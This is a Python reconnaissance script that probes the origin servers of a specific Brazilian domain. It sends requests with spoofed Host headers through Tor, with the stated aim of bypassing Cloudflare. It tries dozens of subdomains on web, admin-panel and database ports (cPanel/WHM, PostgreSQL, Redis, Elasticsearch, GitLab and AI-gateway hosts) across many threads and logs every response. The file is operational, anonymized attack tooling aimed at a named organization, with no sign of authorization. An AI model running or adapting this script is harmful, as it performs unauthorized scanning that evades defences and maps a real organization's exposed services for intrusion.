#!/usr/bin/env python3
"""Active recon: probe origin IPs with vhost headers via Tor SOCKS5.
Bypass Cloudflare by hitting origin IPs directly with proper Host: header.
"""
import socket, ssl, sys, json, time, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

SOCKS_HOST, SOCKS_PORT = "127.0.0.1", 9050
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4467.114 Safari/537.36"

# (IP, [list of vhosts to try], [list of ports])
TARGETS = {
    "201.54.0.48":   (["drive","cloudreve","registry","rag","mcp-aws","mcp-auth","tools-executor","litellm","gitlab","grafana","n8n","redash","plataforma","portal","suporte","api","prf","pf","premium","zipcode","tutoryplans","study-plan-tracker","uptime","tei","www","dsoconcursos"], [443,80,8080,8443,5000,3000,9443]),
    "3.83.108.124":  (["mcp-aws","mcp-auth","tools-executor","litellm","drive","registry","rag","api"], [443,80,8080,8443]),
    "177.39.18.137":(["mail","webmail","mentoria","novo","paginas","ppf","tracker","tutorytools","drive","registry","api","plataforma"], [443,80,8080,2095,2096,8443]),
    "177.39.18.138":(["nginx","drive","registry","api","plataforma","litellm","mcp-aws"], [443,80,8080,8443]),
    "201.46.120.158":(["whm","cronograma","cpanel","webmail","webdisk","drive","registry","api"], [443,80,2087,2083,2096,2095,8080,8443]),
    "201.46.120.163":(["bd","postgres","mysql","mongo","redis","elastic","registry","drive"], [5432,5433,3306,27017,6379,9200,8080,8443,443,80,5000]),
    "201.46.120.57": (["mail","smtp","envio","drive","registry"], [25,465,587,2525,80,443]),
}

def http_probe(ip, host, port, scheme="https", path="/", timeout=12):
    """Send raw HTTP request through Tor SOCKS5 and return (status, server, title, size, body_head)."""
    # Use socks module to connect
    try:
        import socks
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, SOCKS_HOST, SOCKS_PORT)
        s.settimeout(timeout)
        s.connect((ip, port))
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
               f"Accept: */*\r\nConnection: close\r\n\r\n")
        s.sendall(req.encode())
        chunks = []
        total = 0
        while True:
            try:
                d = s.recv(8192)
            except Exception:
                break
            if not d: break
            chunks.append(d)
            total += len(d)
            if total > 256*1024: break
        s.close()
        raw = b"".join(chunks)
    except Exception as e:
        return (None, None, None, 0, f"ERR: {type(e).__name__}: {str(e)[:80]}")
    # Parse
    head, _, body = raw.partition(b"\r\n\r\n")
    try:
        head_str = head.decode("latin1")
    except: head_str = str(head)
    status = None
    server = None
    for line in head_str.split("\r\n"):
        if line.startswith("HTTP/"):
            m = re.match(r"HTTP/\S+\s+(\d+)", line)
            if m: status = m.group(1)
        m = re.match(r"Server:\s*(.+)", line, re.I)
        if m: server = m.group(1).strip()
    title = None
    tm = re.search(r"<title[^>]*>([^<]*)</title>", body.decode("latin1", errors="ignore"), re.I)
    if tm: title = tm.group(1).strip()[:120]
    return (status, server, title, len(body), head_str.split("\r\n")[:15])

def probe_one(args):
    ip, host_fqdn, port, scheme = args
    status, server, title, size, hdrs = http_probe(ip, host_fqdn, port, scheme)
    return (ip, host_fqdn, port, scheme, status, server, title, size, hdrs)

def main():
    tasks = []
    for ip, (subs, ports) in TARGETS.items():
        for sub in subs:
            fqdn = f"{sub}.dsoconcursos.com.br"
            for port in ports:
                scheme = "https" if port in (443,2087,2083,2096,2095,8443,9443) else "http"
                tasks.append((ip, fqdn, port, scheme))
    print(f"[*] {len(tasks)} probe tasks queued", file=sys.stderr)
    results = []
    with ThreadPoolExecutor(max_workers=32) as ex:
        futs = [ex.submit(probe_one, t) for t in tasks]
        for f in as_completed(futs):
            r = f.result()
            results.append(r)
            ip, fqdn, port, scheme, status, server, title, size, hdrs = r
            if status and status != "000" and status is not None:
                print(f"{ip}:{port} ({scheme}) Host:{fqdn} -> {status} server={server} title={title!r} size={size}")
    # Save full results
    with open("raw/httpx_origin_raw.json","w") as f:
        json.dump([{
            "ip":r[0],"host":r[1],"port":r[2],"scheme":r[3],
            "status":r[4],"server":r[5],"title":r[6],"size":r[7],
            "headers":r[8]
        } for r in results], f, indent=2)
    # Print summary
    print("\n=== SUMMARY (non-empty responses) ===")
    for r in sorted(results, key=lambda x: (x[0],x[2])):
        if r[4] and r[4] not in ("000",None):
            print(f"{r[0]}:{r[2]} ({r[3]}) {r[1]} -> {r[4]} | {r[5]} | {r[6]} | sz={r[7]}")

if __name__ == "__main__":
    main()
